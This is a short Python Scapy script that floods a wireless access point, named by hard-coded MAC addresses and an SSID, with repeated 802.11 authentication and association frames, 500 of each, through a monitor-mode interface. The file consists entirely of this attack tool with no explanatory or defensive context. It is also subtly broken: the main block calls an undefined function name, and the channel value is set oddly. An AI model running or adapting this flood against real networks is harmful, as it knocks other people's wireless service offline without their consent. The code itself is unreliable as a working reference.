from scapy.all import *
 
recipients_mac_adress = 'B6:70:64:8A:C0:FC'
your_mac_adress = 'b8:81:98:6e:14:5a'
ssid = '41D3N'
channel = chr(149)
interface = 'mon0'
 
ALGO_OPEN_AUTH = 0  # open authentication mode
START_SEQNUM = 1  # sequence number

def auth_attack():
    #authentication
    frame1 = RadioTap()\
        /Dot11(type=0, subtype=11, addr1=recipients_mac_adress, addr2=your_mac_adress, addr3=recipients_mac_adress)\
        /Dot11Auth(algo=ALGO_OPEN_AUTH, seqnum=START_SEQNUM)
 
    #association
    frame2 = RadioTap()\
        /Dot11(type=0, subtype=0, addr1=recipients_mac_adress, addr2=your_mac_adress, addr3=recipients_mac_adress)\
        /Dot11AssoReq()\
        /Dot11Elt(ID='SSID', info=ssid)

    i=0
    while i<500:
        sendp(frame1, iface=interface)
        sendp(frame2, iface=interface)
        i=i+1

if __name__=='__main__':
    opn_auth_attack()

